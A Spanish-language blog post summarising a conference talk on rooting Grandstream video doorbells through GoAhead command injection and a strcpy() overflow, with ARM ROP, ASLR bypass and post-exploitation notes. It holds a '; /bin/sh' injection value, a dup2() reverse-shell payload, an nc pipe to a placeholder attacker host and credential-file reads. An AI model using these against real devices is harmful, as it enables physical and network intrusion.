---
layout: single
title: "EuskalHack IX — Hackeando videoporteros: acceso root sin llamar al timbre"
date: 2026-06-20
permalink: /conference/euskalhack-ix-videoportero-iot/
excerpt: "Root completo sobre Grandstream: CVE-2020-5763 (command injection en GoAhead) + buffer overflow strcpy(). ROP chain en ARM64 con ASLR, dup2() para reverse shell, credenciales en claro en /etc/sys_default_user."
categories: [conference]
tags: [euskalhack, euskalhack-ix, iot, embedded, arm, rop, buffer-overflow, goahead, grandstream, cve-2020-5763]
toc: true
toc_sticky: true
series: "EuskalHack IX"
header:
  og_image: /assets/images/og-preview.png
---

> **TL;DR (EN):** Full root on a Grandstream video doorbell. Two vulnerabilities: CVE-2020-5763 (command injection in GoAhead) and a strcpy() stack buffer overflow used for the ROP chain. ARM64 ROP chain with ASLR bypass, dup2() for reverse shell, plaintext credentials in /etc/sys_default_user. Exploit "opensesame" by danigargu. Talk by Jose Luis Verdeguer at EuskalHack IX, June 2026.

---

> **Ponente:** Jose Luis Verdeguer · GitHub: [@Pepelux](https://github.com/Pepelux) · X: [@pepeluxx](https://x.com/pepeluxx) · [LinkedIn](https://www.linkedin.com/in/pepelux/) · [Blog](http://blog.pepelux.org)  
> **Congreso:** [EuskalHack IX](/conference/euskalhack-ix/) · Donostia, 19 de junio de 2026 · ES

---

## Target: Grandstream

**Grandstream** es uno de los fabricantes líderes en videoporteros y teléfonos IP. Sus dispositivos están en miles de edificios residenciales y corporativos en España. La superficie de ataque combinó debilidades de diseño clásicas de IoT: contraseñas débiles, firmware mal auditado, interfaces de debug expuestas.

---

## Superficie de ataque

| Vector | Detalle |
|--------|---------|
| **Longitud de contraseña** | Máximo 1-8 caracteres — espacio de fuerza bruta trivial |
| **TLS / SRTP** | Protocolos de seguridad presentes en capa de transporte |
| **Firmware cifrado** | Obstáculo inicial para análisis estático directo |
| **RS232 / UART** | Consola serie — da shell directa en muchos dispositivos IoT |
| **JTAG** | Debug a nivel de CPU: lectura de memoria, breakpoints hardware |
| **Usuario único root** | Sin separación de privilegios — si llegas, eres root |

---

## Servidor web embebido: GoAhead

**GoAhead** es el servidor web embebido más usado en dispositivos IoT y firmware. Implementación ligera en C, diseñada para sistemas con recursos limitados. Presente en routers, cámaras IP, videoporteros, NAS y dispositivos industriales.

### CVE-2020-5763

Vulnerabilidad de **inyección de comandos** en GoAhead. Afecta a múltiples fabricantes. Permite ejecución remota de código sin autenticación en versiones vulnerables. En el caso de Grandstream, el exploit combina esta inyección con un **buffer overflow via `strcpy()`** (descrito abajo) para construir el ROP chain que entrega la shell.

---

## Vulnerabilidades de código

### Buffer Overflow via strcpy()

```c
/* Vulnerable: sin comprobación de longitud */
strcpy(dest_buffer, user_input);

/* Seguro: */
strncpy(dest_buffer, user_input, sizeof(dest_buffer) - 1);
```

`strcpy()` copia datos hasta el byte nulo sin verificar si caben en el buffer. Si el input es mayor que el buffer, se sobreescribe la pila — incluyendo la dirección de retorno. El atacante controla el flujo de ejecución.

### Inyección en campo ping

```
ping -c 1 [INPUT_SIN_SANITIZAR]
```

Si el campo acepta `; /bin/sh`, el sistema ejecuta una shell. Patrón extremadamente común en IoT: cualquier campo que pase user input a `system()` o `popen()` sin sanitizar.

---

## Exploiting sobre ARM

### Convenciones de llamada

- **ARM32** — valor de retorno / primer argumento: registro **R0**
- **ARM64 (AArch64)** — primer argumento: registro **x0**

Esta distinción es crítica para el ROP chain: hay que saber qué registros controlar y cuáles son los gadgets disponibles.

### ASLR

Con ASLR activo, las direcciones base de librerías son aleatorias en cada ejecución. Para construir el ROP chain necesitas la dirección real de las funciones en memoria.

**Estrategia:** encontrar un leak de información o usar gadgets de la PLT cuya dirección es fija independientemente de ASLR. `isoc99_sscanf` es una función de libc usada en algunos exploits para obtener leak de dirección.

### ROP Chain — construcción

**ROPgadget** extrae gadgets de binarios ELF:

```bash
ROPgadget --binary /lib/libc.so.6 --rop
```

Un gadget es una secuencia de instrucciones que termina en `ret` (o `bx lr` en ARM). Gadgets necesarios para shell clásica:

```
1. pop {r0, pc}      → cargar "/bin/sh" en R0
2. dirección system() → ejecutar system("/bin/sh")
3. dirección exit()   → salida limpia
```

---

## Payload: reverse shell con dup2()

```c
/* Redirigir stdin/stdout/stderr al socket de red */
dup2(sockfd, 0);  /* stdin  → socket */
dup2(sockfd, 1);  /* stdout → socket */
dup2(sockfd, 2);  /* stderr → socket */
execve("/bin/sh", args, env);
```

`dup2()` tres veces crea una shell interactiva completamente redirigida al socket. El atacante escribe comandos y recibe la salida como si estuviera sentado delante del dispositivo.

### mprotect() — marcar páginas como ejecutables

```c
/* Cambiar permisos de región de memoria a RWX */
mprotect(addr, size, PROT_READ | PROT_WRITE | PROT_EXEC);
```

Si el dispositivo tiene NX/DEP activo, `mprotect()` via ROP chain puede cambiar los permisos de una región para luego inyectar y ejecutar shellcode ahí.

### Depuración remota con gdb via netcat

```bash
# En el dispositivo:
gdbserver /dev/null --attach PID | nc atacante 4444

# En el atacante:
gdb-multiarch -q
(gdb) target remote :4444
```

---

## Post-explotación

### Credenciales en texto plano

```bash
cat /etc/sys_default_user
# admin:contraseña_visible
```

Patrón habitual en IoT: credenciales por defecto en ficheros de configuración para el proceso de reset de fábrica.

### nvram — configuración persistente

La memoria NVRAM almacena configuración que sobrevive a reinicios:
- Credenciales de red WiFi
- Contraseña de administrador configurada por el usuario
- Configuración SIP (extensión, servidor, credenciales VoIP)

Con acceso root, un dump completo de NVRAM puede contener credenciales de la red interna.

### El exploit: opensesame

El PoC se llamó **opensesame** — apropiado para un exploit que abre puertas. Desarrollado por **danigargu** (Daniel García Gutiérrez), investigador de seguridad español conocido por exploits en IoT y kernel de Linux/Windows.

---

## Conceptos relacionados

### Extracción y análisis de firmware

**Binwalk** — extracción automática de filesystems:

```bash
binwalk -e firmware.bin      # extrae filesystems
binwalk -A firmware.bin      # identifica arquitectura del código
strings firmware.bin | grep -i "password\|passwd\|secret\|key\|admin"
```

**Ghidra / IDA Pro** — disassembler/decompiler para analizar binarios ARM sin código fuente. Ghidra (NSA, gratuito), IDA Pro (estándar de industria, de pago).

### Otras vulnerabilidades IoT comunes

- **Format string** — `printf(user_input)` sin especificador → lectura/escritura de memoria arbitraria
- **Command injection** — cualquier campo a `system()`/`popen()` sin sanitizar
- **Credenciales hardcodeadas** — contraseñas de servicio en el binario, extraíbles con `strings`

### ASLR bypass

| Técnica | Descripción |
|---------|-------------|
| **ret2plt** | Usar entradas de la PLT como gadgets (dirección fija sin ASLR) |
| **ret2libc** | Llamar a `system()` directamente con `/bin/sh` |
| **Information leak** | Bug que filtre una dirección → calcular base de libc |

### NX / DEP

Protección hardware que marca el stack y el heap como no-ejecutables. Si está activo, no puedes ejecutar shellcode en el stack directamente → necesitas ROP chain o `mprotect()`.

### Impacto real de un videoportero comprometido

- Acceso a cámara y micrófono
- Apertura de puerta (si el videoportero controla el relé)
- Credenciales WiFi desde NVRAM
- Pivoting a la red interna (el videoportero está en la LAN)
- Shodan indexa miles de instancias de GoAhead expuestas en internet

### SIP (Session Initiation Protocol)

Los videoporteros usan SIP para VoIP. Sin SRTP, el audio va en claro y es interceptable. Las credenciales SIP en NVRAM son objetivo prioritario.

---

---

## EuskalHack IX — Serie completa

| # | Post |
|---|------|
| Índice | [Notas técnicas — todas las charlas](/conference/euskalhack-ix/) |
| 1 | [Agentic AI Supremacy — Is your AI a double-agent?](/conference/euskalhack-ix-agentic-ai/) |
| 2 | [Insiders: detección de amenazas internas](/conference/euskalhack-ix-insiders-ueba/) |
| 3 | **Hackeando videoporteros — root sin llamar al timbre** ← estás aquí |
| 4 | [ATMs conectados a AWS: ¿qué podría salir mal?](/conference/euskalhack-ix-atms-aws/) |
| 5 | [Radar real con ESP32 por menos de 15€](/conference/euskalhack-ix-radar-esp32/) |
| 6 | [Análisis de vulnerabilidades de firmware](/conference/euskalhack-ix-firmware-analysis/) |
| 7 | [Minifilters: Owning the High (and Low) Ground](/conference/euskalhack-ix-minifilters-kernel/) |
